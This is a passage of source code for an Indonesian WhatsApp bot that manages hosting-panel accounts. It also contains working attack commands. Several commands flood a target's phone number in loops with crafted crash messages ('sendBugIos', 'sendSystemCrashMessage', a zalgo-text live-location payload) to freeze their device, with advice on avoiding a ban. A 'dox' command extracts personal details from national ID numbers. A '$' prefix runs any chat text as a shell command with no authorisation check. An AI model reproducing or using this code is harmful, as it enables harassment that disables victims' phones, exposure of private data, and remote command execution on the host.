locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "11gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11GB"
let egg = global.eggsnya
let loc = global.location
let memo = "11240"
let cpu = "280"
let disk = "11240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "toadmin": {
if (!isOwner) return reply(`*hedeh si ajg*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "rezzx"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@resladp.dery",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TIPE : ADMIN PANEL

ID : ${user.id}
UUID : ${user.uuid}
 USERNAME : ${user.username}
 EMAIL : ${user.email}
 NAMA : ${user.first_name} ${user.last_name}
 BAHASA :  ${user.language}
 ADMIN : ~NO~ YES
 DIBUAT PADA TANGGAL/HARI :  

LINK LOGIN AKAN DIKIRIMKAN LEWAT PRIBADI
`
    const listMessage = {

        text: tks,

    }

	

    await rezzx.sendMessage(m.chat, listMessage)

    await rezzx.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : 1. OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

*2. JANGAN OTAK ATIK ADMIN PANEL KALO KETAUAN OTAK ATIK ADMIN PANEL DENDA 30K*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
//==========BAGIAN MENU BUK========//

case 'rezzx-mode-gacor': case '4khyren': case '4k-hyren': case 'hyren-4k': case 'rezzxhyren':
if (!isPremium && !isOwner) return reply(`KHUSUS BABU REZZX `)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`Rezz X 4K Hyren Mode Ryoiki Tenkai`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
}
reply(`Udah Ni , Coba Chat Target C1 apa C2 Semoga aja C1,Btw Jangan sering pake ya dijeda 2-5menit biar ga ke benet:v <  > Rezz X 4KHyren v11`)
break

case 'rezzxvip': case 'tembusipong': case 'tembusios': case 'sendpeler':
if (!isPremium && !isOwner) return reply(`KHUSUS BABU REZZX `)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`Rezz X 4K Hyren Mode Ryoiki Tenkai`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
}
reply(`Udah Ni , Coba Chat Target C1 apa C2 Semoga aja C1,Btw Jangan sering pake ya dijeda 2-5menit biar ga ke benet:v <  > Rezz X 4KHyren v11`)
break

case 'samsungcrash': case 'alldevicesamsung': case 'tembussamung':
if (!isPremium && !isOwner) return reply(`KHUSUS BABU REZZX `)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`Rezz X 4K Hyren Mode Ryoiki Tenkai`)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
}
reply(`Udah Ni , Coba Chat Target C1 apa C2 Semoga aja C1,Btw Jangan sering pake ya dijeda 2-5menit biar ga ke benet:v <  > Rezz X 4KHyren v11`)
break

case 'emang-anjg': case 'emang-ajg': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await rezzx.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await reply(' Cie Panik , RezzX V11 ')
}
break

//================ CASE LANGKA ===========//

  case 'nikparser': case 'dox':
  {
    if (!isOwner) return reply('Khusus owner')
    
    if (!q) return reply(`<> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx`)
    const { nikParser } = require('nik-parser')
    let title = "`</> NIK DOX </>`\n\n";
    const ktp = `${m.text}`;
    const nik = nikParser(ktp)
    await m.reply(`${title}> *NIK:* ${nik.isValid()}\n> *Provinsi ID:* ${nik.provinceId()}\n> *Nama Provinsi:* ${nik.province()}\n> *Kabupaten-ID:* ${nik.kabupatenKotaId()}\n> *Nama Kabupaten:* ${nik.kabupatenKota()}\n> *Kecamatan-ID:* ${nik.kecamatanId()}\n> *Nama Kecamatan:* ${nik.kecamatan()}\n> *Kode Pos:* ${nik.kodepos()}\n> *Jenis Kelamin:* ${nik.kelamin()}\n> *Tanggal Lahir:* ${nik.lahir()}\n> *Uniqcode:* ${nik.uniqcode()}`);
 } 
 break 
case "owner": {
const repf = await rezzx.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
rezzx.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Kuh`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283131164107`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rezzx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283131164107`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283131164107`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rezzx.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283131164107`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
//JANGAN DIUBAH NTAR ERROR KAPOK LU//
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
rezzx.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})